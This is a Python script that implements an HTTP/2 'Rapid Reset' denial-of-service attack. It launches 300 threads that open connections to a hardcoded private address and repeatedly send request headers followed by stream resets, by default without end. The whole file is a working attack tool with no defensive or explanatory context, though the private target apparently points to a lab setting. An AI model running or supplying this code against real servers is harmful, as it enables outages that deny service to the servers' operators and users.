import socket
import threading
import time
import sys
import random
import argparse
import h2.connection
import h2.config

TARGET_IP    = "192.168.20.10"
TARGET_PORT  = 80
THREAD_COUNT = 300

parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset multi-threaded attacker")
parser.add_argument(
    "cancel_rate", type=float, nargs="?", default=1.0,
    help="Probability of RST_STREAM per HEADERS frame, 0.0–1.0 (default: 1.0)",
)
parser.add_argument(
    "--duration", type=int, default=None,
    help="Attack duration in seconds; omit for infinite",
)
args = parser.parse_args()

CANCEL_RATE = args.cancel_rate
end_time    = time.time() + args.duration if args.duration else None


def attack_worker(worker_id: int):
    while end_time is None or time.time() < end_time:
        try:
            raw_socket = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3)
            h2_conn = h2.connection.H2Connection(
                config=h2.config.H2Configuration(client_side=True)
            )
            h2_conn.initiate_connection()
            raw_socket.sendall(h2_conn.data_to_send())

            stream_id = 1
            while end_time is None or time.time() < end_time:
                headers = [
                    (":method",    "GET"),
                    (":authority", TARGET_IP),
                    (":scheme",    "http"),
                    (":path",      "/"),
                    ("user-agent", f"RapidReset-MegaBot-{worker_id}"),
                ]
                h2_conn.send_headers(stream_id, headers)
                if random.random() < CANCEL_RATE:
                    h2_conn.reset_stream(stream_id, error_code=0x8)
                raw_socket.sendall(h2_conn.data_to_send())
                stream_id += 2
                time.sleep(0.001)

        except Exception:
            if end_time and time.time() >= end_time:
                break
            time.sleep(0.5)


print(
    f"🔥 [Attacker] {THREAD_COUNT} threads started. "
    f"Cancel Rate: {CANCEL_RATE*100:.1f}%"
    + (f"  Duration: {args.duration}s" if args.duration else "  Duration: ∞")
)
sys.stdout.flush()

for i in range(THREAD_COUNT):
    t = threading.Thread(target=attack_worker, args=(i,))
    t.daemon = True
    t.start()

if args.duration:
    time.sleep(args.duration + 1)
    print("⏹️  Duration reached. Stopping.")
else:
    while True:
        time.sleep(1)
